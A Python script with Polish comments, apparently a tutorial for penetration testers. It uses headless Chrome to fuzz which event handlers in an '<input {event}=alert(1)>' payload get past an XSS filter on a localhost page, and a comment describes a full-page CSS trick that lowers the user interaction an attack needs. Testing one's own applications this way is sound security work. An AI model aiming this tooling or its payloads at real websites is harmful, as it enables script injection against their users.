from selenium import webdriver
from selenium.common.exceptions import TimeoutException, InvalidSessionIdException, NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.common.action_chains import ActionChains
from termcolor import colored


def load_events(file='events.txt'):
    '''
    Funkcja przyjmuje jako argument ścieżkę do pliku zawierającego listę event handlerów, każdy w nowej linii. Domyślnie wczytuje z pliku events.txt

    Funkcja zwraca listę event handlerów
    '''

    # Wczytaj plik ze ścieżki "file" w trybie odczytu i przypisz go do zmiennej "infile"
    with open(file, 'r') as infile:
        # wczytaj zawartość pliku i załaduj kolejne linie jako elementy listy
        events = infile.read().split('\n')
    # Zwróć listę event handlerów
    return events


def create_driver():
    '''
    Funkcja tworzy i zwraca przeglądarkę chromium, którą będzie można kontrolować z poziomu tego skryptu.
    '''
    chrome_options = webdriver.ChromeOptions()
    # Opcja --headless powoduje, że okno przeglądarki nie będzie się pojawiało. 
    chrome_options.add_argument('--headless') 
    driver = webdriver.Chrome(options=chrome_options)
    return driver


def is_alert_present(driver, payload):
    '''
    Argumenty:
        driver: przeglądarka stworzona modułem selenium.webdriver
        payload: string zawierający payload do przetestowania

    Wartość zwracana:
        True jeżeli pojawił się alert, False jeżeli go nie było
    '''

    # tworzymy URL z payloadem
    url = f'http://localhost/?name={payload}'


    try:

        # wysyłamy żądanie do stworzonego adresu
        driver.get(url)
    except (InvalidSessionIdException, UnboundLocalError):

        # obsługujemy wyjątek w razie, gdyby nasza przeglądarka została zamknięta
        # Wtedy tworzymy nową i wysyłamy żądanie do stworzonego adresu
        driver = create_driver()
        driver.get(url)

    try:
        # tworzymy akcję, żeby móc ruszać i klikać myszą
        action = ActionChains(driver)

        # Szukamy naszego elementu z tagiem <input> na stronie
        # Jeżeli nie zostanie znaleziony, zostanie rzucony wyjątek NoSuchElementException
        # Tak zdarzy się, jeżeli dany event handler będzie zablokowany 
        input_tag = driver.find_element_by_tag_name("input")

        # ruszamy myszą nad nasz tag i klikamy na niego
        # pozwala to zwiększyć nasze szanse na udany atak
        # Przed napisaniem raportu warto sprawdzić, które z payloadów działają z ruchem myszy, które z kliknięciem, a które od razu, ponieważ im więcej interakcji tym mniejsze ryzyko 
        action.move_to_element(input_tag).click().perform()

        # czekamy przez pół sekundy na pojawienie się alertu
        # jeżeli się nie pojawi, zostanie rzucony wyjątek TimeoutException
        WebDriverWait(driver, 0.5).until(expected_conditions.alert_is_present())
        
        # zamykamy alert, żeby można było zamknąć kartę
        driver.switch_to.alert.accept()

        # jeżeli doszliśmy tutaj, to znaczy, że atak się udał, zwracamy prawdę
        return True

    except TimeoutException:
        # jeżeli jesteśmy tutaj, to alert nie pojawił się na stronie, zwracamy fałsz
        return False
    except NoSuchElementException:
        # tutaj trafimy, jeżeli naszego tagu nie będzie na stronie, najczęściej wtedy, gdy dany event handler jest zablokowany
        return False
    finally:
        # blok finally zostanie zawsze wykonany na końcu, nawet jeżeli jest rzucony wyjątek.
        # zamykamy tu naszą kartę przeglądarki
        driver.close()


if __name__ == '__main__':
    # wczytujemy event handlery
    events = load_events()

    # tworzymy przeglądarkę
    driver = create_driver()

    # iterujemy po eventach
    for event in events:

        # tworzymy payload, który w każdej iteracji będzie zawierał inny event handler
        payload = f'<input {event}=alert(1)>'
        # atrybut z CSS, który sprawi, że element będzie na całej stronie 
        # style=top:0;left:0;position:absolute;width:100%;height:100%
        # dzięki temu będziemy mieli atak bez dużej interakcji, nawet jeżeli będzie wymagał, żeby najechać na niego myszą (bo będzie na całej stronie, więc ciężko będzie na niego nie najechać)

        # wywołujemy naszą najważniejszą funkcję sprawdzającą, czy payload powoduje alert, czy nie
        alert = is_alert_present(driver, payload)

        # na końcu print z wynikami.
        # jak widać, został zastosowany if wewnątrz argumentu
        # moduł termcolor pozwala nam pisać output w różnych kolorach
        print(payload, colored('VULNERABLE', 'red') if alert else colored('NOT VULNERABLE', 'green'))

    